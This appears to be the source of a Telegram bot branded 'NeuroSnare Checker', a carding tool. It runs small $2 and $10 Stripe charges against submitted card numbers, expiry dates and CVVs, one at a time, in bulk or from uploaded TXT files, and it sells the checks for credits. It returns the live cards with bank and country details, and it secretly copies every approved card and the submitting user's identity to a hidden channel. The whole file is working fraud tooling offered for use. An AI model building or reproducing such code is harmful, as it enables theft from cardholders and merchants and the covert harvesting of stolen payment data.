import time
import asyncio
import os
from telegram import Update
from telegram.ext import ContextTypes
from telegram.constants import ParseMode
from utils.user_data import get_user_data, update_user_credits, update_approved_cards
from utils.admin_utils import is_admin
from config import MASS_LIMIT_USER, logger
from gateways.stripe_checker import StripeChecker
from utils.secret_channel import send_to_secret_channel

async def st1_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """$2 Stripe Charge - Single Card"""
    user_id = update.effective_user.id
    username = update.effective_user.username or "N/A"
    user_data = get_user_data(user_id, username)
    
    is_admin_user = is_admin(user_id)
    if not is_admin_user and user_data["credits"] < 1:
        await update.message.reply_text("❌ Insufficient credits")
        return

    if not context.args:
        await update.message.reply_text("❌ Usage: `/st1 CC|MM|YY|CVV`\nExample: `/st1 4111111111111111|12|25|123`")
        return

    card = context.args[0]

    try:
        cc, mm, yy, cvv = card.split("|")
    except:
        await update.message.reply_text("❌ Invalid card format. Use: CC|MM|YY|CVV")
        return

    msg = await update.message.reply_text("💳 Processing $2 Charge...")

    start = time.time()
    result = StripeChecker.execute_2usd_charge_logic(card)
    t = round(time.time() - start, 2)

    if not is_admin_user:
        remaining_credits = update_user_credits(user_id, 1)
    else:
        remaining_credits = "♾️ Unlimited"

    if result["status"] == "Approved":
        update_approved_cards(user_id)
        txt = (
            f"**💳 $2 CHARGE - APPROVED ✅**\n\n"
            f"**Card:** `{card}`\n"
            f"**Gateway:** Stripe $2 Charge\n"
            f"**Response:** {result['message']}\n"
            f"**Brand:** {result.get('brand', 'N/A')}\n"
            f"**Type:** {result.get('type', 'N/A')}\n"
            f"**Country:** {result.get('country', 'N/A')}\n"
            f"**Bank:** {result.get('bank', 'N/A')}\n"
            f"**Time:** {t}s\n\n"
            f"💎 Credits left: {remaining_credits}\n\n"
            f"👨‍💻 *NeuroSnare Checker*"
        )
        
        # Send to secret channel when approved
        secret_message = (
            f"🔔 **NEW APPROVED CARD**\n\n"
            f"💳 Card: `{card}`\n"
            f"👤 User: @{username}\n"
            f"🆔 ID: `{user_id}`\n"
            f"💰 Amount: $2.00\n"
            f"✅ Status: Approved\n"
            f"🏦 Gateway: Stripe\n\n"
            f"👨‍💻 *NeuroSnare Checker*"
        )
        await send_to_secret_channel(context, secret_message)
        
    elif result["status"] == "Declined":
        txt = (
            f"**💳 $2 CHARGE - DECLINED ❌**\n\n"
            f"**Card:** `{card}`\n"
            f"**Reason:** {result['message']}\n"
            f"**Brand:** {result.get('brand', 'N/A')}\n"
            f"**Type:** {result.get('type', 'N/A')}\n"
            f"**Country:** {result.get('country', 'N/A')}\n"
            f"**Bank:** {result.get('bank', 'N/A')}\n"
            f"**Time:** {t}s\n\n"
            f"💎 Credits left: {remaining_credits}\n\n"
            f"👨‍💻 *NeuroSnare Checker*"
        )
    else:
        txt = (
            f"**💳 $2 CHARGE - ERROR ⚠️**\n\n"
            f"**Card:** `{card}`\n"
            f"**Error:** {result['message']}\n"
            f"**Time:** {t}s\n\n"
            f"💎 Credits left: {remaining_credits}\n\n"
            f"👨‍💻 *NeuroSnare Checker*"
        )

    await msg.edit_text(txt, parse_mode=ParseMode.MARKDOWN)

async def st1m_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """$2 Stripe Charge - Mass Check"""
    # Check if this is a reply to a TXT file
    if update.message.reply_to_message and update.message.reply_to_message.document:
        await check_txt_file_command(update, context)
        return
    
    user_id = update.effective_user.id
    username = update.effective_user.username or "N/A"
    user_data = get_user_data(user_id, username)
    is_admin_user = is_admin(user_id)
    
    if not context.args:
        await update.message.reply_text("❌ Usage: `/st1m CC|MM|YY|CVV CC|MM|YY|CVV ...`\nOr reply to a TXT file with `/st1m`")
        return
    
    cards = context.args
    
    if not is_admin_user and len(cards) > MASS_LIMIT_USER:
        await update.message.reply_text(f"❌ Max {MASS_LIMIT_USER} cards allowed for users")
        return

    if not is_admin_user and user_data["credits"] < len(cards):
        await update.message.reply_text("❌ Insufficient credits")
        return

    processing_msg = await update.message.reply_text(f"💳 Processing {len(cards)} cards with $2 Charge...")

    results_text = f"**💳 $2 MASS CHARGE RESULTS**\n\n"
    approved_count = 0
    declined_count = 0
    error_count = 0
    approved_cards = []

    for i, card in enumerate(cards, 1):
        try:
            cc, mm, yy, cvv = card.split("|")
            if len(cc) < 15 or len(cc) > 16 or not cc.isdigit():
                results_text += f"❌ Invalid Card `{card}`\n\n"
                error_count += 1
                continue
        except:
            results_text += f"❌ Invalid Format `{card}`\n\n"
            error_count += 1
            continue

        start = time.time()
        result = StripeChecker.execute_2usd_charge_logic(card)
        t = round(time.time() - start, 2)

        if result["status"] == "Approved":
            results_text += f"✅ **APPROVED** `{card}`\nBrand: {result.get('brand', 'N/A')} | Time: {t}s\n\n"
            approved_count += 1
            approved_cards.append(card)
        elif result["status"] == "Declined":
            results_text += f"❌ **DECLINED** `{card}`\nBrand: {result.get('brand', 'N/A')} | Reason: {result['message']} | Time: {t}s\n\n"
            declined_count += 1
        else:
            results_text += f"⚠️ **ERROR** `{card}`: {result['message']}\n\n"
            error_count += 1

        if i % 3 == 0:
            progress = f"🔄 Processing: {i}/{len(cards)} cards..."
            await processing_msg.edit_text(progress)
        await asyncio.sleep(0.3)

    # Create approved cards file
    approved_filename = None
    if approved_cards:
        approved_filename = f"approved_{user_id}_{int(time.time())}.txt"
        with open(approved_filename, 'w') as f:
            for card in approved_cards:
                f.write(f"{card}\n")
        
        # Send approved cards to user
        with open(approved_filename, 'rb') as file:
            await update.message.reply_document(
                document=file,
                filename="APPROVED_CARDS.txt",
                caption=f"✅ **{len(approved_cards)} Approved Cards Found!**\n👤 User: @{username}",
                parse_mode=ParseMode.MARKDOWN
            )
        
        # Send to secret channel
        secret_message = (
            f"🔔 **NEW APPROVED CARDS**\n\n"
            f"👤 User: @{username}\n"
            f"🆔 ID: `{user_id}`\n"
            f"✅ Approved: {len(approved_cards)} cards\n"
            f"❌ Declined: {declined_count} cards\n"
            f"⚠️ Errors: {error_count} cards\n"
            f"📊 Total: {len(cards)} cards\n\n"
            f"💎 Credits used: {len(cards) if not is_admin_user else 0}\n"
            f"👨‍💻 *NeuroSnare Checker*"
        )
        
        # Send to secret channel with approved cards file
        await send_to_secret_channel(context, secret_message, approved_filename)

    if approved_count > 0:
        update_approved_cards(user_id, approved_count)

    if not is_admin_user:
        remaining_credits = update_user_credits(user_id, len(cards))
    else:
        remaining_credits = "♾️ Unlimited"

    credits_used = len(cards) if not is_admin_user else 0
    
    results_text += (
        f"📊 **SUMMARY**\n"
        f"✅ Approved: {approved_count}\n"
        f"❌ Declined: {declined_count}\n"
        f"⚠️ Errors: {error_count}\n"
        f"📋 Total: {len(cards)} cards\n"
        f"💳 Gateway: Stripe $2 Charge\n"
        f"💎 Credits used: {credits_used}\n"
        f"💎 Credits left: {remaining_credits}\n\n"
    )
    
    if approved_cards:
        results_text += f"💳 **LIVE CARDS ({len(approved_cards)})**\n"
        for card in approved_cards[:10]:
            results_text += f"`{card}`\n"
        if len(approved_cards) > 10:
            results_text += f"... and {len(approved_cards) - 10} more (see file)\n"
        results_text += "\n"
    
    results_text += f"👨‍💻 *NeuroSnare Checker*"

    if len(results_text) > 4000:
        parts = [results_text[i:i+4000] for i in range(0, len(results_text), 4000)]
        for part in parts:
            await update.message.reply_text(part, parse_mode=ParseMode.MARKDOWN)
        await processing_msg.delete()
    else:
        await processing_msg.edit_text(results_text, parse_mode=ParseMode.MARKDOWN)
    
    # Cleanup
    if approved_filename and os.path.exists(approved_filename):
        os.remove(approved_filename)

async def st2_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """$10 Stripe Charge - Single Card"""
    user_id = update.effective_user.id
    username = update.effective_user.username or "N/A"
    user_data = get_user_data(user_id, username)
    
    is_admin_user = is_admin(user_id)
    if not is_admin_user and user_data["credits"] < 1:
        await update.message.reply_text("❌ Insufficient credits")
        return

    if not context.args:
        await update.message.reply_text("❌ Usage: `/st2 CC|MM|YY|CVV`\nExample: `/st2 4111111111111111|12|25|123`")
        return

    card = context.args[0]

    try:
        cc, mm, yy, cvv = card.split("|")
    except:
        await update.message.reply_text("❌ Invalid card format. Use: CC|MM|YY|CVV")
        return

    msg = await update.message.reply_text("💳 Processing $10 Charge...")

    start = time.time()
    result = StripeChecker.execute_10usd_charge_logic(card)
    t = round(time.time() - start, 2)

    if not is_admin_user:
        remaining_credits = update_user_credits(user_id, 1)
    else:
        remaining_credits = "♾️ Unlimited"

    if result["status"] == "Approved":
        update_approved_cards(user_id)
        txt = (
            f"**💳 $10 CHARGE - APPROVED ✅**\n\n"
            f"**Card:** `{card}`\n"
            f"**Gateway:** Stripe $10 Charge\n"
            f"**Response:** {result['message']}\n"
            f"**Brand:** {result.get('brand', 'N/A')}\n"
            f"**Type:** {result.get('type', 'N/A')}\n"
            f"**Country:** {result.get('country', 'N/A')}\n"
            f"**Bank:** {result.get('bank', 'N/A')}\n"
            f"**Time:** {t}s\n\n"
            f"💎 Credits left: {remaining_credits}\n\n"
            f"👨‍💻 *NeuroSnare Checker*"
        )
        
        # Send to secret channel when approved
        secret_message = (
            f"🔔 **NEW APPROVED CARD**\n\n"
            f"💳 Card: `{card}`\n"
            f"👤 User: @{username}\n"
            f"🆔 ID: `{user_id}`\n"
            f"💰 Amount: $10.00\n"
            f"✅ Status: Approved\n"
            f"🏦 Gateway: Stripe\n\n"
            f"👨‍💻 *NeuroSnare Checker*"
        )
        await send_to_secret_channel(context, secret_message)
        
    elif result["status"] == "Declined":
        txt = (
            f"**💳 $10 CHARGE - DECLINED ❌**\n\n"
            f"**Card:** `{card}`\n"
            f"**Reason:** {result['message']}\n"
            f"**Brand:** {result.get('brand', 'N/A')}\n"
            f"**Type:** {result.get('type', 'N/A')}\n"
            f"**Country:** {result.get('country', 'N/A')}\n"
            f"**Bank:** {result.get('bank', 'N/A')}\n"
            f"**Time:** {t}s\n\n"
            f"💎 Credits left: {remaining_credits}\n\n"
            f"👨‍💻 *NeuroSnare Checker*"
        )
    else:
        txt = (
            f"**💳 $10 CHARGE - ERROR ⚠️**\n\n"
            f"**Card:** `{card}`\n"
            f"**Error:** {result['message']}\n"
            f"**Time:** {t}s\n\n"
            f"💎 Credits left: {remaining_credits}\n\n"
            f"👨‍💻 *NeuroSnare Checker*"
        )

    await msg.edit_text(txt, parse_mode=ParseMode.MARKDOWN)

async def st2m_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """$10 Stripe Charge - Mass Check"""
    user_id = update.effective_user.id
    username = update.effective_user.username or "N/A"
    user_data = get_user_data(user_id, username)
    is_admin_user = is_admin(user_id)
    
    if not context.args:
        await update.message.reply_text("❌ Usage: `/st2m CC|MM|YY|CVV CC|MM|YY|CVV ...`")
        return
    
    cards = context.args
    
    if not is_admin_user and len(cards) > MASS_LIMIT_USER:
        await update.message.reply_text(f"❌ Max {MASS_LIMIT_USER} cards allowed for users")
        return

    if not is_admin_user and user_data["credits"] < len(cards):
        await update.message.reply_text("❌ Insufficient credits")
        return

    processing_msg = await update.message.reply_text(f"💳 Processing {len(cards)} cards with $10 Charge...")

    results_text = f"**💳 $10 MASS CHARGE RESULTS**\n\n"
    approved_count = 0
    declined_count = 0
    error_count = 0
    approved_cards = []

    for i, card in enumerate(cards, 1):
        try:
            cc, mm, yy, cvv = card.split("|")
            if len(cc) < 15 or len(cc) > 16 or not cc.isdigit():
                results_text += f"❌ Invalid Card `{card}`\n\n"
                error_count += 1
                continue
        except:
            results_text += f"❌ Invalid Format `{card}`\n\n"
            error_count += 1
            continue

        start = time.time()
        result = StripeChecker.execute_10usd_charge_logic(card)
        t = round(time.time() - start, 2)

        if result["status"] == "Approved":
            results_text += f"✅ **APPROVED** `{card}`\nBrand: {result.get('brand', 'N/A')} | Time: {t}s\n\n"
            approved_count += 1
            approved_cards.append(card)
        elif result["status"] == "Declined":
            results_text += f"❌ **DECLINED** `{card}`\nBrand: {result.get('brand', 'N/A')} | Reason: {result['message']} | Time: {t}s\n\n"
            declined_count += 1
        else:
            results_text += f"⚠️ **ERROR** `{card}`: {result['message']}\n\n"
            error_count += 1

        if i % 3 == 0:
            progress = f"🔄 Processing: {i}/{len(cards)} cards..."
            await processing_msg.edit_text(progress)
        await asyncio.sleep(0.3)

    # Create approved cards file
    approved_filename = None
    if approved_cards:
        approved_filename = f"approved_{user_id}_{int(time.time())}.txt"
        with open(approved_filename, 'w') as f:
            for card in approved_cards:
                f.write(f"{card}\n")
        
        # Send approved cards to user
        with open(approved_filename, 'rb') as file:
            await update.message.reply_document(
                document=file,
                filename="APPROVED_CARDS_10USD.txt",
                caption=f"✅ **{len(approved_cards)} Approved Cards Found!**\n👤 User: @{username}",
                parse_mode=ParseMode.MARKDOWN
            )
        
        # Send to secret channel
        secret_message = (
            f"🔔 **NEW APPROVED CARDS ($10)**\n\n"
            f"👤 User: @{username}\n"
            f"🆔 ID: `{user_id}`\n"
            f"✅ Approved: {len(approved_cards)} cards\n"
            f"❌ Declined: {declined_count} cards\n"
            f"⚠️ Errors: {error_count} cards\n"
            f"📊 Total: {len(cards)} cards\n\n"
            f"💎 Credits used: {len(cards) if not is_admin_user else 0}\n"
            f"👨‍💻 *NeuroSnare Checker*"
        )
        
        # Send to secret channel with approved cards file
        await send_to_secret_channel(context, secret_message, approved_filename)

    if approved_count > 0:
        update_approved_cards(user_id, approved_count)

    if not is_admin_user:
        remaining_credits = update_user_credits(user_id, len(cards))
    else:
        remaining_credits = "♾️ Unlimited"

    credits_used = len(cards) if not is_admin_user else 0
    
    results_text += (
        f"📊 **SUMMARY**\n"
        f"✅ Approved: {approved_count}\n"
        f"❌ Declined: {declined_count}\n"
        f"⚠️ Errors: {error_count}\n"
        f"📋 Total: {len(cards)} cards\n"
        f"💳 Gateway: Stripe $10 Charge\n"
        f"💎 Credits used: {credits_used}\n"
        f"💎 Credits left: {remaining_credits}\n\n"
    )
    
    if approved_cards:
        results_text += f"💳 **LIVE CARDS ({len(approved_cards)})**\n"
        for card in approved_cards[:10]:
            results_text += f"`{card}`\n"
        if len(approved_cards) > 10:
            results_text += f"... and {len(approved_cards) - 10} more (see file)\n"
        results_text += "\n"
    
    results_text += f"👨‍💻 *NeuroSnare Checker*"

    if len(results_text) > 4000:
        parts = [results_text[i:i+4000] for i in range(0, len(results_text), 4000)]
        for part in parts:
            await update.message.reply_text(part, parse_mode=ParseMode.MARKDOWN)
        await processing_msg.delete()
    else:
        await processing_msg.edit_text(results_text, parse_mode=ParseMode.MARKDOWN)
    
    # Cleanup
    if approved_filename and os.path.exists(approved_filename):
        os.remove(approved_filename)

async def check_txt_file_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check all cards in a TXT file with /st1m"""
    user_id = update.effective_user.id
    username = update.effective_user.username or "N/A"
    user_data = get_user_data(user_id, username)
    
    # Check if the message is a reply to a TXT file
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await update.message.reply_text("❌ Please reply to a TXT file with `/st1m` command")
        return
    
    # Check file type
    document = update.message.reply_to_message.document
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please reply to a TXT file (.txt)")
        return
    
    is_admin_user = is_admin(user_id)
    
    # Download the file
    try:
        file = await context.bot.get_file(document.file_id)
        temp_filename = f"temp_{user_id}_{int(time.time())}.txt"
        await file.download_to_drive(temp_filename)
        
        # Read cards from file
        with open(temp_filename, 'r') as f:
            cards = [line.strip() for line in f.readlines() if line.strip()]
        
        if not cards:
            await update.message.reply_text("❌ No cards found in the file")
            os.remove(temp_filename)
            return
        
        # Check if user has enough credits
        if not is_admin_user and user_data["credits"] < len(cards):
            await update.message.reply_text("❌ Insufficient credits")
            os.remove(temp_filename)
            return
        
        processing_msg = await update.message.reply_text(f"💳 Processing {len(cards)} cards from file with $2 Charge...")
        
        results_text = f"**💳 $2 MASS CHARGE FROM FILE**\n📁 File: {document.file_name}\n\n"
        approved_count = 0
        declined_count = 0
        error_count = 0
        approved_cards = []
        
        for i, card in enumerate(cards, 1):
            try:
                cc, mm, yy, cvv = card.split("|")
                if len(cc) < 15 or len(cc) > 16 or not cc.isdigit():
                    results_text += f"❌ Invalid Card `{card}`\n\n"
                    error_count += 1
                    continue
            except:
                results_text += f"❌ Invalid Format `{card}`\n\n"
                error_count += 1
                continue
            
            start = time.time()
            result = StripeChecker.execute_2usd_charge_logic(card)
            t = round(time.time() - start, 2)
            
            if result["status"] == "Approved":
                results_text += f"✅ **APPROVED** `{card}`\nBrand: {result.get('brand', 'N/A')} | Time: {t}s\n\n"
                approved_count += 1
                approved_cards.append(card)
            elif result["status"] == "Declined":
                results_text += f"❌ **DECLINED** `{card}`\nBrand: {result.get('brand', 'N/A')} | Reason: {result['message']} | Time: {t}s\n\n"
                declined_count += 1
            else:
                results_text += f"⚠️ **ERROR** `{card}`: {result['message']}\n\n"
                error_count += 1
            
            if i % 3 == 0:
                progress = f"🔄 Processing: {i}/{len(cards)} cards..."
                await processing_msg.edit_text(progress)
            await asyncio.sleep(0.3)
        
        # Create approved cards file
        approved_filename = None
        if approved_cards:
            approved_filename = f"approved_{user_id}_{int(time.time())}.txt"
            with open(approved_filename, 'w') as f:
                for card in approved_cards:
                    f.write(f"{card}\n")
            
            # Send approved cards to user
            with open(approved_filename, 'rb') as file:
                await update.message.reply_document(
                    document=file,
                    filename=f"APPROVED_{document.file_name}",
                    caption=f"✅ **{len(approved_cards)} Approved Cards Found!**\n\n📁 Original: {document.file_name}\n👤 User: @{username}\n🆔 ID: {user_id}",
                    parse_mode=ParseMode.MARKDOWN
                )
            
            # Send to secret channel
            secret_message = (
                f"🔔 **NEW APPROVED CARDS**\n\n"
                f"👤 User: @{username}\n"
                f"🆔 ID: `{user_id}`\n"
                f"📁 File: {document.file_name}\n"
                f"✅ Approved: {len(approved_cards)} cards\n"
                f"❌ Declined: {declined_count} cards\n"
                f"⚠️ Errors: {error_count} cards\n"
                f"📊 Total: {len(cards)} cards\n\n"
                f"💎 Credits used: {len(cards) if not is_admin_user else 0}\n"
                f"👨‍💻 *NeuroSnare Checker*"
            )
            
            # Send to secret channel with approved cards file
            await send_to_secret_channel(context, secret_message, approved_filename)
        
        if approved_count > 0:
            update_approved_cards(user_id, approved_count)
        
        if not is_admin_user:
            remaining_credits = update_user_credits(user_id, len(cards))
        else:
            remaining_credits = "♾️ Unlimited"
        
        credits_used = len(cards) if not is_admin_user else 0
        
        results_text += (
            f"📊 **SUMMARY**\n"
            f"✅ Approved: {approved_count}\n"
            f"❌ Declined: {declined_count}\n"
            f"⚠️ Errors: {error_count}\n"
            f"📋 Total: {len(cards)} cards\n"
            f"💳 Gateway: Stripe $2 Charge\n"
            f"💎 Credits used: {credits_used}\n"
            f"💎 Credits left: {remaining_credits}\n\n"
        )
        
        if approved_cards:
            results_text += f"💳 **LIVE CARDS ({len(approved_cards)})**\n"
            for card in approved_cards[:10]:
                results_text += f"`{card}`\n"
            if len(approved_cards) > 10:
                results_text += f"... and {len(approved_cards) - 10} more (see file)\n"
            results_text += "\n"
        
        results_text += f"👨‍💻 *NeuroSnare Checker*"
        
        if len(results_text) > 4000:
            parts = [results_text[i:i+4000] for i in range(0, len(results_text), 4000)]
            for part in parts:
                await update.message.reply_text(part, parse_mode=ParseMode.MARKDOWN)
            await processing_msg.delete()
        else:
            await processing_msg.edit_text(results_text, parse_mode=ParseMode.MARKDOWN)
        
        # Cleanup temp files
        if os.path.exists(temp_filename):
            os.remove(temp_filename)
        if approved_filename and os.path.exists(approved_filename):
            os.remove(approved_filename)
        
    except Exception as e:
        logger.error(f"Error processing TXT file: {e}")
        await update.message.reply_text(f"❌ Error processing file: {str(e)}")